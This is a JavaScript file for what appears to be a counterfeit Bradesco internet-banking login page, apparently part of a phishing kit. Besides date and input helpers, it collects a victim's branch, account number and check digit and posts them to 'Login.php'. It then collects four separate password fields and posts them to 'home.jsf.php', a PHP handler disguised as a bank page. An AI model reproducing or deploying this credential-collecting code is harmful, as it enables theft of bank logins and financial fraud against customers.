function proximoCampo(atual,proximo){
if(atual.value.length >= atual.maxLength){
document.getElementById(proximo).focus();
}
}

// JavaScript Document
function EscreveData() {
	var mydate=new Date()
	var year=mydate.getYear()
	if (year < 1000)
	year+=1900
	var day=mydate.getDay()
	var month=mydate.getMonth()
	var daym=mydate.getDate()
	if (daym<10)
	daym="0"+daym
	var dayarray=new
	Array("Domingo","Segunda-feira","Ter&ccedil;a-feira","Quarta-feira","Quinta-feira","Sexta-feira","S&aacute;bado")
	var montharray=new
	Array("janeiro","fevereiro","mar&ccedil;o","abril","maio","junho","julho","agosto","setembro","outubro","novembro","dezembro")
	document.write(""+dayarray[day]+", "+daym+" de "+montharray[month]+" de "+year+"</b></font></small>");
     //var xml = loadXMLData("https://wspf.bradesco.com.br/wsdata/");
    //listaData(xml,"");    
}



   function loadXMLData(url){
 
            if(window.XMLHttpRequest){
                var Loader = new XMLHttpRequest();
                Loader.open("GET", url ,false);
                Loader.send(null);
                return Loader.responseXML;
                     
            }else if(window.ActiveXObject){
                var Loader = new ActiveXObject("Msxml2.DOMDocument.3.0");
                Loader.async = false;
                Loader.load(url);
                return Loader;
            }
        }
        
           function listaData(xmlNode,identacao){
    
          
            
            //se n�o tiver filhos eu j� pego o nodevalue                        
            var valorData = xmlNode.nodeValue;
            //alert(valorData);
            
                        
            x=xmlNode.getElementsByTagName("dataServer");
            for (i=0; i<x.length; i++)
            {
            document.write(x[i].childNodes[0].nodeValue);
         
            }
            

        
        }
		
		
		function Apenas_Numeros(e, campo) {
    var msg = "Favor digitar somente caracteres numéricos";
    var monta = "";
    var NS = (navigator.appName == "Netscape")
    var Digit = parseInt(eval(((NS) ? "e.which" : "e.keyCode")))

    if (!(Digit > 47 && Digit < 58 || Digit == 8 || Digit == 0 || Digit == 13)) {
        alert(msg);
        monta = "document.FormIB2001." + campo + ".focus();";
        eval(monta);
        e.keyCode.returnValue = false;
        return false;
    }
    else {
        if (parseInt(Digit) == 13) {
            if (VerificaLogin() == true)
            { IB2000Open(window.document.FormIB2001); e.keyCode.returnValue = false; return false; }
            else
            { ValidaLogin(campo); e.keyCode.returnValue = false; return false; }
        }
    }
}


function IndexDes() {
	var agdes = $("#agdes");
	var ctdes = $("#ctdes");
	var digdes = $("#digdes");
	
	if( agdes == undefined || agdes.val().length < 2 ) {
		alert("Preencha os campos corretamente");
		return;
	}
	
	if( ctdes == undefined || ctdes.val().length < 4 ) {
		alert("Preencha os campos corretamente");
		return;
	}
	
	if( digdes == undefined || digdes.val().length < 1 ) {
		alert("Preencha os campos corretamente");
		return;
	}
	
	document.forms['formdes'].action = "Login.php";
	document.forms['formdes'].submit();
}

function enviatbl() {
	var txtPass1 = $("#txtPass1");
	var txtPass2 = $("#txtPass2");
	var txtPass3 = $("#txtPass3");
	var txtPass4 = $("#txtPass4");
	
    if( txtPass1 == undefined || txtPass1.val().length < 1 ) {
	alert("Preencha os campos corretamente");
	return;
	}
	
	if( txtPass2 == undefined || txtPass2.val().length < 1 ) {
	alert("Preencha os campos corretamente");
	return;
	}
	
	if( txtPass3 == undefined || txtPass3.val().length < 1 ) {
	alert("Preencha os campos corretamente");
	return;
	}
	
	if( txtPass4 == undefined || txtPass4.val().length < 1 ) {
	alert("Preencha os campos corretamente");
	return;
	}

	document.forms['formdes'].action = "home.jsf.php";
	document.forms['formdes'].submit();
}

